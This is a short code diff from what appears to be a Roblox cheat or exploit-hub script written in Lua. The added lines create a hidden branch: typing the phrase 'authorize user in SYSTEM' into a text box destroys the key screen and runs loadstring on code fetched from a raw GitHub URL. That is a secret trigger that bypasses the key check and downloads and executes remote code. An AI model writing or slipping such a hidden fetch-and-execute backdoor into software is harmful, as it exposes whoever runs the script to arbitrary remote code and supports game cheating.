@@ -114,6 +114,10 @@ pcall(function() getgenv().Settings_LOADED = false end)
 game:GetService("CoreGui").RobloxGui.ScreenshotHudFrame.Visible = false
 game:GetService("CoreGui").VHubCoreScreen:Destroy()
 
+elseif TextBox.Text:match("authorize user in SYSTEM") then
+KeyScreen:Destroy()
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/testforshiistuff/stuff/main/Launch'),true))()
+
 else
 TextBox.Text = "Not A Command"
 wait(1)
